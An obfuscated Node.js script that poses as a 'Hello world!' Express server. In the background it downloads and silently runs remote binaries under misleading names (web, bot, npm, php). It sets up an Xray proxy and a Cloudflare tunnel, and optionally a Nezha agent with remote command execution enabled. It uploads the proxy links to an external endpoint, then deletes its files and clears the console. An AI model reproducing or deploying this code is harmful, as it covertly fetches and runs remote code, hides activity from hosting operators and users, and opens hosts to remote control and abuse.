const _0x3b2d6e=_0x1bb9;(function(_0x53408e,_0x31747a){const _0x28cdf1=_0x1bb9,_0x3b5de0=_0x53408e();while(!![]){try{const _0x59a0c4=parseInt(_0x28cdf1(0x12c))/0x1*(parseInt(_0x28cdf1(0x14c))/0x2)+-parseInt(_0x28cdf1(0x165))/0x3+parseInt(_0x28cdf1(0x15f))/0x4*(parseInt(_0x28cdf1(0x10e))/0x5)+parseInt(_0x28cdf1(0xfb))/0x6+parseInt(_0x28cdf1(0xfc))/0x7+-parseInt(_0x28cdf1(0x15a))/0x8+-parseInt(_0x28cdf1(0x142))/0x9*(parseInt(_0x28cdf1(0xe7))/0xa);if(_0x59a0c4===_0x31747a)break;else _0x3b5de0['push'](_0x3b5de0['shift']());}catch(_0x4fedaf){_0x3b5de0['push'](_0x3b5de0['shift']());}}}(_0x5b75,0x3df3a));const express=require('express'),app=express(),axios=require(_0x3b2d6e(0x104)),os=require('os'),fs=require('fs'),path=require(_0x3b2d6e(0xcd)),{promisify}=require(_0x3b2d6e(0xd7)),exec=promisify(require('child_process')['exec']),{execSync}=require(_0x3b2d6e(0xcf)),UPLOAD_URL=process[_0x3b2d6e(0xee)][_0x3b2d6e(0xc0)]||'',PROJECT_URL=process[_0x3b2d6e(0xee)][_0x3b2d6e(0xc3)]||'',AUTO_ACCESS=process['env'][_0x3b2d6e(0x130)]||![],FILE_PATH=process[_0x3b2d6e(0xee)][_0x3b2d6e(0x105)]||'./tmp',SUB_PATH=process[_0x3b2d6e(0xee)][_0x3b2d6e(0x144)]||_0x3b2d6e(0x148),PORT=process['env'][_0x3b2d6e(0x116)]||process[_0x3b2d6e(0xee)][_0x3b2d6e(0x117)]||0xbb8,UUID=process[_0x3b2d6e(0xee)][_0x3b2d6e(0x140)]||_0x3b2d6e(0x133),NEZHA_SERVER=process[_0x3b2d6e(0xee)]['NEZHA_SERVER']||'',NEZHA_PORT=process['env']['NEZHA_PORT']||'',NEZHA_KEY=process[_0x3b2d6e(0xee)][_0x3b2d6e(0xbf)]||'',ARGO_DOMAIN=process[_0x3b2d6e(0xee)][_0x3b2d6e(0xc9)]||'',ARGO_AUTH=process[_0x3b2d6e(0xee)][_0x3b2d6e(0x135)]||'',ARGO_PORT=process['env']['ARGO_PORT']||0x1f41,CFIP=process['env'][_0x3b2d6e(0xe4)]||_0x3b2d6e(0xcb),CFPORT=process[_0x3b2d6e(0xee)][_0x3b2d6e(0xc5)]||0x1bb,NAME=process[_0x3b2d6e(0xee)][_0x3b2d6e(0x112)]||_0x3b2d6e(0xe3);!fs[_0x3b2d6e(0x15c)](FILE_PATH)?(fs[_0x3b2d6e(0x13e)](FILE_PATH),console['log'](FILE_PATH+_0x3b2d6e(0x149))):console['log'](FILE_PATH+_0x3b2d6e(0x12b));let npmPath=path[_0x3b2d6e(0x14d)](FILE_PATH,'npm'),phpPath=path[_0x3b2d6e(0x14d)](FILE_PATH,'php'),webPath=path[_0x3b2d6e(0x14d)](FILE_PATH,_0x3b2d6e(0xc7)),botPath=path[_0x3b2d6e(0x14d)](FILE_PATH,_0x3b2d6e(0x13f)),subPath=path[_0x3b2d6e(0x14d)](FILE_PATH,_0x3b2d6e(0x164)),listPath=path[_0x3b2d6e(0x14d)](FILE_PATH,_0x3b2d6e(0x11f)),bootLogPath=path['join'](FILE_PATH,'boot.log'),configPath=path[_0x3b2d6e(0x14d)](FILE_PATH,'config.json');function deleteNodes(){const _0x762a89=_0x3b2d6e;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x2a2990;try{_0x2a2990=fs[_0x762a89(0xd3)](subPath,_0x762a89(0xe2));}catch{return null;}const _0x2e9586=Buffer['from'](_0x2a2990,'base64')[_0x762a89(0xff)](_0x762a89(0xe2)),_0x570d0a=_0x2e9586[_0x762a89(0xd0)]('\x0a')[_0x762a89(0x102)](_0x5f0cfb=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x762a89(0x103)](_0x5f0cfb));if(_0x570d0a[_0x762a89(0xc6)]===0x0)return;return axios[_0x762a89(0xd6)](UPLOAD_URL+_0x762a89(0x168),JSON[_0x762a89(0x14f)]({'nodes':_0x570d0a}),{'headers':{'Content-Type':_0x762a89(0x161)}})[_0x762a89(0xf3)](_0x4a7212=>{return null;});}catch(_0x2a3226){return null;}}function cleanupOldFiles(){const _0x672537=_0x3b2d6e,_0x4d4d07=[_0x672537(0xc7),'bot',_0x672537(0x10b),_0x672537(0x14e),_0x672537(0x164),_0x672537(0xef)];_0x4d4d07['forEach'](_0x11d4bc=>{const _0x7934=_0x672537,_0x2e6d1e=path[_0x7934(0x14d)](FILE_PATH,_0x11d4bc);fs[_0x7934(0xbc)](_0x2e6d1e,()=>{});});}function _0x5b75(){const _0x10b299=['2087','\x0avless://','quic','\x0a\x20\x20\x0atrojan://','Error\x20downloading\x20files:','mkdirSync','bot','UUID','false','153cTXLAd','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x201\x0aserver:\x20','SUB_PATH','vmess','Download\x20','/vmess-argo?ed=2560','sub','\x20is\x20created','arch','bot\x20is\x20running.','106804hZXciX','join','php','stringify','--tls','block','config.json','Empowerment\x20success\x20for\x20','freedom','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','https://oooo.serv00.net/add-url','https://arm64.ssss.nyc.mn/web','web\x20is\x20running','\x20successfully','1766448oDsviX','http\x20server\x20is\x20running\x20on\x20port:','existsSync','curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','includes','1804336ZWiHYV','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','application/json','has','nohup\x20','sub.txt','116568HeeSHE','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','Content-Type','/api/delete-nodes','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','trojan','log','/vless-argo','\x20failed:\x20','unlink','Error\x20reading\x20boot.log:','npm\x20is\x20running','NEZHA_KEY','UPLOAD_URL','https+local://8.8.8.8/dns-query','tls','PROJECT_URL','2083','CFPORT','length','web','forEach','ARGO_DOMAIN','send','www.visa.com.sg','error','path','https://amd64.ssss.nyc.mn/agent','child_process','split','rm\x20-rf\x20','\x20>/dev/null\x202>&1\x20&','readFileSync','php\x20is\x20running','createWriteStream','post','util','arm64','2053','set','unlinkSync','\x0aclient_secret:\x20','/vmess-argo','2096','Empowerment\x20failed\x20for\x20','status','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','utf-8','Vls','CFIP','\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20','none','443810LPVxBA','unshift','bot\x20is\x20running','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','?security=tls&sni=','tcp','Error\x20executing\x20command:\x20','env','boot.log','http','npm\x20running\x20error:\x20','&type=ws&host=','catch','map','arm','ARGO_DOMAIN:','./web','443','then','\x0a\x20\x20\x0avmess://','1400928VaEcCS','1466549yXvOrl','pipe','pop','toString','/config.json\x20>/dev/null\x202>&1\x20&','tunnel.json','filter','test','axios','FILE_PATH','https://arm64.ssss.nyc.mn/v1','/dev/null','amd','vless','fileName','npm','https://arm64.ssss.nyc.mn/2go','8443','5cOqbmS','message','direct','\x0a\x20\x20tunnel:\x20','NAME','blackhole','TunnelSecret','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','SERVER_PORT','PORT','get','/trojan-argo','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','base64','127.0.0.1','Subscription\x20uploaded\x20successfully','listen','list.txt','config.yaml','match','tunnel.yml','&path=%2Ftrojan-argo%3Fed%3D2560#','https://amd64.ssss.nyc.mn/web','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','push','https://amd64.ssss.nyc.mn/v1','from','https://amd64.ssss.nyc.mn/2go','App\x20is\x20running','\x20already\x20exists','7DpBYbY','writeFileSync','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','pkill\x20-f\x20\x22[b]ot\x22\x20>\x20/dev/null\x202>&1','AUTO_ACCESS','data','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','9afd1229-b893-40c1-84dd-51e7ce204913','web\x20running\x20error:\x20','ARGO_AUTH','fileUrl','/tunnel.yml\x20run','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'];_0x5b75=function(){return _0x10b299;};return _0x5b75();}app[_0x3b2d6e(0x118)]('/',function(_0x770c14,_0x474d70){_0x474d70['send']('Hello\x20world!');});function _0x1bb9(_0x2ce628,_0x32aa49){const _0x5b7544=_0x5b75();return _0x1bb9=function(_0x1bb9fe,_0x303748){_0x1bb9fe=_0x1bb9fe-0xbc;let _0x241e42=_0x5b7544[_0x1bb9fe];return _0x241e42;},_0x1bb9(_0x2ce628,_0x32aa49);}const config={'log':{'access':_0x3b2d6e(0x107),'error':_0x3b2d6e(0x107),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x3b2d6e(0x109),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x3b2d6e(0xe6),'fallbacks':[{'dest':0xbb9},{'path':_0x3b2d6e(0x16c),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x3b2d6e(0x119),'dest':0xbbc}]},'streamSettings':{'network':_0x3b2d6e(0xec)}},{'port':0xbb9,'listen':_0x3b2d6e(0x11c),'protocol':_0x3b2d6e(0x109),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x3b2d6e(0xec),'security':'none'}},{'port':0xbba,'listen':_0x3b2d6e(0x11c),'protocol':_0x3b2d6e(0x109),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x3b2d6e(0xe6),'wsSettings':{'path':_0x3b2d6e(0x16c)}},'sniffing':{'enabled':!![],'destOverride':[_0x3b2d6e(0xf0),_0x3b2d6e(0xc2),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x3b2d6e(0x11c),'protocol':_0x3b2d6e(0x145),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x3b2d6e(0xdd)}},'sniffing':{'enabled':!![],'destOverride':[_0x3b2d6e(0xf0),_0x3b2d6e(0xc2),_0x3b2d6e(0x13b)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x3b2d6e(0x16a),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x3b2d6e(0x119)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x3b2d6e(0xc2),_0x3b2d6e(0x13b)],'metadataOnly':![]}}],'dns':{'servers':[_0x3b2d6e(0xc1)]},'outbounds':[{'protocol':_0x3b2d6e(0x154),'tag':_0x3b2d6e(0x110)},{'protocol':_0x3b2d6e(0x113),'tag':_0x3b2d6e(0x151)}]};fs[_0x3b2d6e(0x12d)](path[_0x3b2d6e(0x14d)](FILE_PATH,_0x3b2d6e(0x152)),JSON['stringify'](config,null,0x2));function getSystemArchitecture(){const _0x2ddbdd=_0x3b2d6e,_0x371e5c=os[_0x2ddbdd(0x14a)]();return _0x371e5c==='arm'||_0x371e5c===_0x2ddbdd(0xd8)||_0x371e5c==='aarch64'?_0x2ddbdd(0xf5):_0x2ddbdd(0x108);}function downloadFile(_0x711343,_0x595f7e,_0x1de809){const _0x1a6309=_0x3b2d6e,_0x20941f=path[_0x1a6309(0x14d)](FILE_PATH,_0x711343),_0x3dd190=fs[_0x1a6309(0xd5)](_0x20941f);axios({'method':_0x1a6309(0x118),'url':_0x595f7e,'responseType':'stream'})[_0x1a6309(0xf9)](_0x1cf426=>{const _0x125e33=_0x1a6309;_0x1cf426[_0x125e33(0x131)][_0x125e33(0xfd)](_0x3dd190),_0x3dd190['on']('finish',()=>{const _0xf39a24=_0x125e33;_0x3dd190['close'](),console[_0xf39a24(0x16b)](_0xf39a24(0x146)+_0x711343+_0xf39a24(0x159)),_0x1de809(null,_0x711343);}),_0x3dd190['on'](_0x125e33(0xcc),_0x361574=>{const _0x121371=_0x125e33;fs[_0x121371(0xbc)](_0x20941f,()=>{});const _0x2d3819=_0x121371(0x146)+_0x711343+_0x121371(0x16d)+_0x361574['message'];console['error'](_0x2d3819),_0x1de809(_0x2d3819);});})[_0x1a6309(0xf3)](_0x52273e=>{const _0x3bfa52=_0x1a6309,_0x2c139e=_0x3bfa52(0x146)+_0x711343+_0x3bfa52(0x16d)+_0x52273e[_0x3bfa52(0x10f)];console[_0x3bfa52(0xcc)](_0x2c139e),_0x1de809(_0x2c139e);});}async function downloadFilesAndRun(){const _0x4da5fd=_0x3b2d6e,_0x29fd44=getSystemArchitecture(),_0x13faea=getFilesForArchitecture(_0x29fd44);if(_0x13faea[_0x4da5fd(0xc6)]===0x0){console[_0x4da5fd(0x16b)](_0x4da5fd(0x11a));return;}const _0x107a49=_0x13faea[_0x4da5fd(0xf4)](_0x3a38b1=>{return new Promise((_0x43c5e1,_0x44a5b1)=>{const _0x1824ec=_0x1bb9;downloadFile(_0x3a38b1[_0x1824ec(0x10a)],_0x3a38b1[_0x1824ec(0x136)],(_0x225671,_0x274080)=>{_0x225671?_0x44a5b1(_0x225671):_0x43c5e1(_0x274080);});});});try{await Promise['all'](_0x107a49);}catch(_0x42bb10){console['error'](_0x4da5fd(0x13d),_0x42bb10);return;}function _0x1e2e54(_0x969cde){const _0x3d0ba1=0x1fd;_0x969cde['forEach'](_0x46ac0b=>{const _0x43da2e=_0x1bb9,_0x2d485c=path[_0x43da2e(0x14d)](FILE_PATH,_0x46ac0b);fs['existsSync'](_0x2d485c)&&fs['chmod'](_0x2d485c,_0x3d0ba1,_0x5c7cb0=>{const _0x4b23dd=_0x43da2e;_0x5c7cb0?console[_0x4b23dd(0xcc)](_0x4b23dd(0xdf)+_0x2d485c+':\x20'+_0x5c7cb0):console[_0x4b23dd(0x16b)](_0x4b23dd(0x153)+_0x2d485c+':\x20'+_0x3d0ba1['toString'](0x8));});});}const _0x38ae5e=NEZHA_PORT?['./npm',_0x4da5fd(0xf7),'./bot']:['./php',_0x4da5fd(0xf7),'./bot'];_0x1e2e54(_0x38ae5e);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x509869=NEZHA_SERVER['includes'](':')?NEZHA_SERVER['split'](':')[_0x4da5fd(0xfe)]():'',_0x91a3d4=new Set([_0x4da5fd(0xf8),_0x4da5fd(0x10d),_0x4da5fd(0xde),_0x4da5fd(0x139),_0x4da5fd(0xc4),_0x4da5fd(0xd9)]),_0x4bf675=_0x91a3d4[_0x4da5fd(0x162)](_0x509869)?'true':_0x4da5fd(0x141),_0x315dda=_0x4da5fd(0xdc)+NEZHA_KEY+_0x4da5fd(0x143)+NEZHA_SERVER+_0x4da5fd(0xe5)+_0x4bf675+_0x4da5fd(0x169)+UUID;fs[_0x4da5fd(0x12d)](path['join'](FILE_PATH,_0x4da5fd(0x120)),_0x315dda);const _0x1084ae='nohup\x20'+FILE_PATH+'/php\x20-c\x20\x22'+FILE_PATH+_0x4da5fd(0xe1);try{await exec(_0x1084ae),console[_0x4da5fd(0x16b)](_0x4da5fd(0xd4)),await new Promise(_0x2ce427=>setTimeout(_0x2ce427,0x3e8));}catch(_0x291b5c){console[_0x4da5fd(0xcc)]('php\x20running\x20error:\x20'+_0x291b5c);}}else{let _0x4174ef='';const _0x3baf13=[_0x4da5fd(0xf8),'8443',_0x4da5fd(0xde),_0x4da5fd(0x139),'2083',_0x4da5fd(0xd9)];_0x3baf13['includes'](NEZHA_PORT)&&(_0x4174ef=_0x4da5fd(0x150));const _0x3f1a4d='nohup\x20'+FILE_PATH+'/npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x4174ef+'\x20>/dev/null\x202>&1\x20&';try{await exec(_0x3f1a4d),console['log'](_0x4da5fd(0xbe)),await new Promise(_0x293877=>setTimeout(_0x293877,0x3e8));}catch(_0x56f84d){console[_0x4da5fd(0xcc)](_0x4da5fd(0xf1)+_0x56f84d);}}}else console['log']('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x4ac079=_0x4da5fd(0x163)+FILE_PATH+'/web\x20-c\x20'+FILE_PATH+_0x4da5fd(0x100);try{await exec(_0x4ac079),console[_0x4da5fd(0x16b)](_0x4da5fd(0x158)),await new Promise(_0x4f13bd=>setTimeout(_0x4f13bd,0x3e8));}catch(_0x32d586){console[_0x4da5fd(0xcc)](_0x4da5fd(0x134)+_0x32d586);}if(fs[_0x4da5fd(0x15c)](path[_0x4da5fd(0x14d)](FILE_PATH,_0x4da5fd(0x13f)))){let _0x31c0d0;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x31c0d0=_0x4da5fd(0x12e)+ARGO_AUTH;else ARGO_AUTH[_0x4da5fd(0x121)](/TunnelSecret/)?_0x31c0d0=_0x4da5fd(0x160)+FILE_PATH+_0x4da5fd(0x137):_0x31c0d0=_0x4da5fd(0x138)+FILE_PATH+_0x4da5fd(0x125)+ARGO_PORT;try{await exec(_0x4da5fd(0x163)+FILE_PATH+'/bot\x20'+_0x31c0d0+'\x20>/dev/null\x202>&1\x20&'),console[_0x4da5fd(0x16b)](_0x4da5fd(0xe9)),await new Promise(_0x16db0e=>setTimeout(_0x16db0e,0x7d0));}catch(_0x43ad11){console[_0x4da5fd(0xcc)](_0x4da5fd(0xed)+_0x43ad11);}}await new Promise(_0x109f6b=>setTimeout(_0x109f6b,0x1388));}function getFilesForArchitecture(_0x56b6ac){const _0x4a3f17=_0x3b2d6e;let _0x5dc856;_0x56b6ac==='arm'?_0x5dc856=[{'fileName':_0x4a3f17(0xc7),'fileUrl':_0x4a3f17(0x157)},{'fileName':_0x4a3f17(0x13f),'fileUrl':_0x4a3f17(0x10c)}]:_0x5dc856=[{'fileName':'web','fileUrl':_0x4a3f17(0x124)},{'fileName':_0x4a3f17(0x13f),'fileUrl':_0x4a3f17(0x129)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x59afa3=_0x56b6ac==='arm'?'https://arm64.ssss.nyc.mn/agent':_0x4a3f17(0xce);_0x5dc856[_0x4a3f17(0xe8)]({'fileName':_0x4a3f17(0x10b),'fileUrl':_0x59afa3});}else{const _0x535675=_0x56b6ac==='arm'?_0x4a3f17(0x106):_0x4a3f17(0x127);_0x5dc856[_0x4a3f17(0xe8)]({'fileName':_0x4a3f17(0x14e),'fileUrl':_0x535675});}}return _0x5dc856;}function argoType(){const _0x1046e4=_0x3b2d6e;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x1046e4(0x16b)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x1046e4(0x15e)](_0x1046e4(0x114))){fs[_0x1046e4(0x12d)](path['join'](FILE_PATH,_0x1046e4(0x101)),ARGO_AUTH);const _0x4450d5=_0x1046e4(0x111)+ARGO_AUTH['split']('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x1046e4(0x14d)](FILE_PATH,_0x1046e4(0x101))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0x1046e4(0x115)+ARGO_PORT+_0x1046e4(0x166);fs[_0x1046e4(0x12d)](path['join'](FILE_PATH,_0x1046e4(0x122)),_0x4450d5);}else console[_0x1046e4(0x16b)](_0x1046e4(0x132));}argoType();async function extractDomains(){const _0x2c164a=_0x3b2d6e;let _0xfab408;if(ARGO_AUTH&&ARGO_DOMAIN)_0xfab408=ARGO_DOMAIN,console['log'](_0x2c164a(0xf6),_0xfab408),await _0x3a8b1a(_0xfab408);else try{const _0x124cd6=fs[_0x2c164a(0xd3)](path[_0x2c164a(0x14d)](FILE_PATH,_0x2c164a(0xef)),_0x2c164a(0xe2)),_0x6e2bde=_0x124cd6[_0x2c164a(0xd0)]('\x0a'),_0x459980=[];_0x6e2bde[_0x2c164a(0xc8)](_0x507617=>{const _0x40094e=_0x507617['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x40094e){const _0x39be8c=_0x40094e[0x1];_0x459980['push'](_0x39be8c);}});if(_0x459980[_0x2c164a(0xc6)]>0x0)_0xfab408=_0x459980[0x0],console[_0x2c164a(0x16b)]('ArgoDomain:',_0xfab408),await _0x3a8b1a(_0xfab408);else{console[_0x2c164a(0x16b)](_0x2c164a(0x155)),fs[_0x2c164a(0xdb)](path[_0x2c164a(0x14d)](FILE_PATH,_0x2c164a(0xef)));async function _0x3df022(){const _0x20b742=_0x2c164a;try{await exec(_0x20b742(0x12f));}catch(_0x364173){}}_0x3df022(),await new Promise(_0x305f73=>setTimeout(_0x305f73,0xbb8));const _0x702c49=_0x2c164a(0x138)+FILE_PATH+_0x2c164a(0x125)+ARGO_PORT;try{await exec(_0x2c164a(0x163)+path[_0x2c164a(0x14d)](FILE_PATH,_0x2c164a(0x13f))+'\x20'+_0x702c49+_0x2c164a(0xd2)),console[_0x2c164a(0x16b)](_0x2c164a(0x14b)),await new Promise(_0x58df66=>setTimeout(_0x58df66,0xbb8)),await extractDomains();}catch(_0x37429d){console[_0x2c164a(0xcc)]('Error\x20executing\x20command:\x20'+_0x37429d);}}}catch(_0x14c17a){console['error'](_0x2c164a(0xbd),_0x14c17a);}async function _0x3a8b1a(_0x54a1b0){const _0x2d4954=_0x2c164a,_0x33d12c=execSync(_0x2d4954(0x15d),{'encoding':_0x2d4954(0xe2)}),_0x23068d=_0x33d12c['trim']();return new Promise(_0x5764a6=>{setTimeout(()=>{const _0x5b760d=_0x1bb9,_0x24c0ff={'v':'2','ps':NAME+'-'+_0x23068d,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x5b760d(0xe6),'net':'ws','type':'none','host':_0x54a1b0,'path':_0x5b760d(0x147),'tls':_0x5b760d(0xc2),'sni':_0x54a1b0,'alpn':''},_0x48a732=_0x5b760d(0x13a)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x54a1b0+_0x5b760d(0xf2)+_0x54a1b0+'&path=%2Fvless-argo%3Fed%3D2560#'+NAME+'-'+_0x23068d+_0x5b760d(0xfa)+Buffer[_0x5b760d(0x128)](JSON[_0x5b760d(0x14f)](_0x24c0ff))[_0x5b760d(0xff)](_0x5b760d(0x11b))+_0x5b760d(0x13c)+UUID+'@'+CFIP+':'+CFPORT+_0x5b760d(0xeb)+_0x54a1b0+_0x5b760d(0xf2)+_0x54a1b0+_0x5b760d(0x123)+NAME+'-'+_0x23068d+'\x0a\x20\x20\x20\x20';console[_0x5b760d(0x16b)](Buffer[_0x5b760d(0x128)](_0x48a732)[_0x5b760d(0xff)]('base64')),fs[_0x5b760d(0x12d)](subPath,Buffer[_0x5b760d(0x128)](_0x48a732)[_0x5b760d(0xff)](_0x5b760d(0x11b))),console[_0x5b760d(0x16b)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uplodNodes(),app[_0x5b760d(0x118)]('/'+SUB_PATH,(_0x1ba694,_0x3dcb5e)=>{const _0x41aa33=_0x5b760d,_0x22b5f3=Buffer[_0x41aa33(0x128)](_0x48a732)[_0x41aa33(0xff)](_0x41aa33(0x11b));_0x3dcb5e[_0x41aa33(0xda)](_0x41aa33(0x167),'text/plain;\x20charset=utf-8'),_0x3dcb5e[_0x41aa33(0xca)](_0x22b5f3);}),_0x5764a6(_0x48a732);},0x7d0);});}}async function uplodNodes(){const _0x24420a=_0x3b2d6e;if(UPLOAD_URL&&PROJECT_URL){const _0x55f7ea=PROJECT_URL+'/'+SUB_PATH,_0x6fb4ce={'subscription':[_0x55f7ea]};try{const _0x5f1694=await axios[_0x24420a(0xd6)](UPLOAD_URL+'/api/add-subscriptions',_0x6fb4ce,{'headers':{'Content-Type':_0x24420a(0x161)}});if(_0x5f1694[_0x24420a(0xe0)]===0xc8)console[_0x24420a(0x16b)]('Subscription\x20uploaded\x20successfully');else return null;}catch(_0x27e393){if(_0x27e393['response']){if(_0x27e393['response'][_0x24420a(0xe0)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x24420a(0x15c)](listPath))return;const _0x404a88=fs[_0x24420a(0xd3)](listPath,_0x24420a(0xe2)),_0x3bb147=_0x404a88[_0x24420a(0xd0)]('\x0a')['filter'](_0x3639eb=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x24420a(0x103)](_0x3639eb));if(_0x3bb147['length']===0x0)return;const _0x5355d9=JSON[_0x24420a(0x14f)]({'nodes':_0x3bb147});try{await axios[_0x24420a(0xd6)](UPLOAD_URL+'/api/add-nodes',_0x5355d9,{'headers':{'Content-Type':_0x24420a(0x161)}});if(response['status']===0xc8)console[_0x24420a(0x16b)](_0x24420a(0x11d));else return null;}catch(_0x5ca124){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x2e8417=_0x1bb9,_0x1b1409=[bootLogPath,configPath,webPath,botPath,phpPath,npmPath];if(NEZHA_PORT)_0x1b1409[_0x2e8417(0x126)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x1b1409[_0x2e8417(0x126)](phpPath);exec(_0x2e8417(0xd1)+_0x1b1409[_0x2e8417(0x14d)]('\x20')+'\x20>/dev/null\x202>&1',_0x3027e4=>{const _0x470cc9=_0x2e8417;console['clear'](),console[_0x470cc9(0x16b)](_0x470cc9(0x12a)),console[_0x470cc9(0x16b)](_0x470cc9(0xea));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x113059=_0x3b2d6e;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x113059(0x16b)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x269308=await axios[_0x113059(0xd6)](_0x113059(0x156),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x113059(0x161)}});console['log']('automatic\x20access\x20task\x20added\x20successfully');}catch(_0x36ef2b){console[_0x113059(0xcc)]('添加URL失败:\x20'+_0x36ef2b[_0x113059(0x10f)]);}}async function startserver(){deleteNodes(),cleanupOldFiles(),await downloadFilesAndRun(),await extractDomains(),AddVisitTask();}startserver(),app[_0x3b2d6e(0x11e)](PORT,()=>console[_0x3b2d6e(0x16b)](_0x3b2d6e(0x15b)+PORT+'!'));